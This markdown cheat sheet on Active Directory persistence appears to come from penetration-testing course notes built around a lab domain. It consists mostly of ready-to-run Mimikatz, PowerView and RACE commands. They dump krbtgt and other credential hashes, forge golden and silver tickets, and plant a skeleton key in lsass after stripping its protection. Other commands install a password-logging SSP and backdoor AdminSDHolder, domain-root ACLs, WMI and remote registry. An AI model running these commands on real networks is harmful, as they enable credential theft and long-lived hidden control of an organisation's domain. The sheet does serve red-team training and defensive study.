## AD Persistence

- [Get krbtgt Hash](#get-krbtgt-hash)
- [Golden Ticket](#golden-ticket)
- [Silver Ticket](#silver-ticket)
- [Skeleton Key](#skeleton-key)
- [DSRM (Directory Services Restore Mode)](#dsrm--directory-services-restore-mode-)
- [SSP (Security Support Provider)](#ssp--security-support-provider-)
- [ACL Persistence](#acl-persistence)
    + [SDPROP and AdminSDHolder](#sdprop-and-adminsdholder)
    + [Domain Root Object ACL](#domain-root-object-acl)
    + [DCSync](#dcsync)
    + [WMI Security Descriptors](#wmi-security-descriptors)
    + [Remote Registry](#remote-registry)
- [MORE](#more)

### Get krbtgt Hash
---
```powershell
# On DC as a DA
C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'

# DC-Sync attack. DA rights required
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user_<domain>\krbtgt"'
```
### Golden Ticket
---
 Need to find the krbtgt's RC4 or AES key. This can be achieved with DA privileges through a DCSync attack.
```powershell
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
                                         /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 
                                         /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
                                         /sid:<domain_sid> /rc4:<krbtgt_hash> /id:500 
                                         /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
                                         
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
                                         /sid:<domain_sid> /aes256:<krbtgt_hash> /id:500 
                                         /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'                                         
```
### Silver Ticket
---
In order to craft a silver ticket, need to find the target service account's RC4 key or AES key. This can be done by capture an NTLM response (preferably NTLMv1) and cracking it, by dumping LSA secrets, doing a dcsync, etc...
```powershell
# Get Privileges to access HOST service as Administrator con host
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
    /service:HOST /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
    
# Privileges for RPCSS service
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn>  
    /service:RPCSS /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
```
### Skeleton Key
---
```powershell
# Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>

# Now can access any host in the domain with any user with password `mimikatz`
C:> Enter-PSSession -Computername <host> -Credential <domain>\<username>
```
```powershell
# If lsass is running proected, need to use mimikatz driver
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect process:lsass.exe /remove
mimikatz # misc ::skeleton
mimikatz # !

```
### DSRM (Directory Services Restore Mode)
---
- There is a local admin on every DC called `Administrator` whose passwd is the DSRM passwd
- Following steps need to be done in a DC session with DA rights
```powershell
# 1. Dump DSRM password (DA privileges required)
C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <hostname>

# (OPTIONAL) 2. Compare the Administrator hash with the Admin hash of this command
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <hostname>

# 3. First one is the DSRM local Admin. Pass the hash can be used to authenticate
# 4. Logon behavior for DSRM account needs to be changed
C:> Enter-PSSession -Computername <hostname> 
C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# 5. Pass the hash. FQDS domain and NTLM Hash obtained for Administrator in step 1.
C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain-dc_host> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
```
### SSP (Security Support Provider)
---
We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!
- Inject into `lsass` using Mimikatz
```powershell
C:> Invoke-Mimikatz -Command '"misc::memssp"'
```
- Use `mimilib.dll`
```powershell
C:> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
C:> $packages += mimilib
C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
- All logons on DC logged to `C:\Windows\system32\kiwissp.log`

### ACL Persistence
---
#### SDPROP and AdminSDHolder

  AdminSDHolder is a special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups (like Domain Admins, Enterprise Admins, etc.) to prevent their accidental and unintended modifications, and to keep them secure.
Once you have agained Domain Admin privileges, AdminSDHolder container can be abused by backdooring it by giving your user GenericAll privileges, which effectively makes that user a Domain Admin.
```powershell
#`sdprop` is a process that runs evey hour and compares ACL of protected groups with members of the ACL of `AdminSDHolder`. Any differences are overwriten.
# With DA privileges on `AdminSDHolder` object, a user can be added to the `AsminSDHolder` ACL and will be added to protected groups when `sdprop` runs
# Load Module
C:> . .\Invoke-SDPropagator.ps1

# Force `sdprop` to run
C:> Invoke-SDPropagator

# Add Full Control Permissions for a user to AdminSDHolder using PowerView
C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc moneycorp,dc=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Add Change PAssword permissions
C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <username> -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Add Write Members
C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <username> -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Check Domain Admins Permissions with Poweriew
C:> Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<username>"}

# Once with permissions, Add User with PowerView
C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose

# Change user password
C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
```
#### Domain Root Object ACL
```powershell
# Add Full Rights to Domain Root ACL
C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
#### DCSync
```powershell
# Check if a user has DCSync rights. Gives nothing if no rights 
C:> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>"}

# DCSync rights on Domain
C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student76 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Execute DCSync
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

#### WMI Security Descriptors

```powershell
# To be able to run WMI commands
C:> . .\RACE.ps1

# Allow <user> WMI access in host. Domain Admin privileges shell process required
C:> Set-RemoteWMI -SamAccountName <username> -ComputerName <hostname_full_FQDN> -namespace 'root\cimv2' -Verbose
```
```powershell
# Give permissions to be able to PS Remoting
# UNSTABLE SINCE SOME M$ PATCHES
C:> . .\RACE.ps1

# Allow <user> WMI access in host. Domain Admin privileges shell process required
C:> Set-RemotePSRemoting –SamAccountName <username> -ComputerName <hostname_full_FQDN> -Verbose

# Now can run WMI on host
C:> gwmi -class win32_operatingsystem -ComputerName <host>
```
#### Remote Registry
```powershell
# Using RACE, with admin privs on remote machine
C:> Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <username> -Verbose

# From a shell as <username>, not DA rights
# As <username> from before, retrieve machine account hash:
C:> Get-RemoteMachineAccountHash -ComputerName <hostname> -Verbose

# As <username> from before, retrieve local account hash:
C:> Get-RemoteLocalAccountHash -ComputerName <hostname> -Verbose

# As <username> from before, retrieve domain cached credentials:
C:> Get-RemoteCachedCredential -ComputerName <hostname> -Verbose

# With this machine account hash can create Silver Tickets
C:> Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain_fqdn> /sid:<domain_sid> /target:<hostname_fqdn> /service:HOST /rc4:<host_hash> /user:Administrator /ptt"'
```
### MORE





